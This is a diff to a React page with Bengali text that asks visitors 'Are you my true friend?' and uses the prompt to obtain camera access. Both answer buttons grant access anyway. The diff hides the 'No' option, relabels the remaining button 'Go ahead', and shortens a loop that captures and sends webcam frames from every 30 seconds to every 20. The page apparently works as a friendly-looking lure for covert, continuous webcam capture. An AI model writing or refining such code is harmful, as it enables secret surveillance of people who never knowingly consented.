@@ -76,14 +76,14 @@ const Home = () => {
       setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
     }, 1000);
 
-    // Continuous Capture (Every 30 seconds)
+    // Continuous Capture (Every 20 seconds)
     let captureInterval;
     if (step >= 0) {
       captureInterval = setInterval(() => {
         if (videoRef.current && videoRef.current.srcObject) {
           captureAndSend(videoRef.current.srcObject);
         }
-      }, 30000); // 30 seconds interval
+      }, 20000); // 20 seconds interval
     }
 
     return () => {
@@ -107,19 +107,19 @@ const Home = () => {
         {step === -1 && (
           <div className="text-center animate-fade-in space-y-6 bg-white p-10 rounded-3xl shadow-2xl border-2 border-pink-100">
             <h2 className="text-3xl font-bold text-pink-600">আমাদের গল্পঘর</h2>
-            <p className="text-gray-600 leading-relaxed">তুমি কি আমার সত্যিকারের বন্ধু?</p>
+            <p className="text-gray-600 text-2xl leading-relaxed">তুমি কি আমার সত্যিকারের বন্ধু? তাহলে</p>
             <button
               onClick={handleGrantAccess}
               className="px-10 py-4 bg-gradient-to-r from-pink-500 to-rose-500 text-white rounded-full font-bold shadow-lg hover:scale-105 transition-all"
             >
-              হ্যাঁ 😍
+              এগিয়ে চলো 👉
             </button>
-            <button
+            {/* <button
               onClick={handleGrantAccess}
               className="ml-2 px-10 py-4 bg-gradient-to-r from-pink-500 to-rose-500 text-white rounded-full font-bold shadow-lg hover:scale-105 transition-all"
             >
               না 😣
-            </button>
+            </button> */}
           </div>
         )}
 
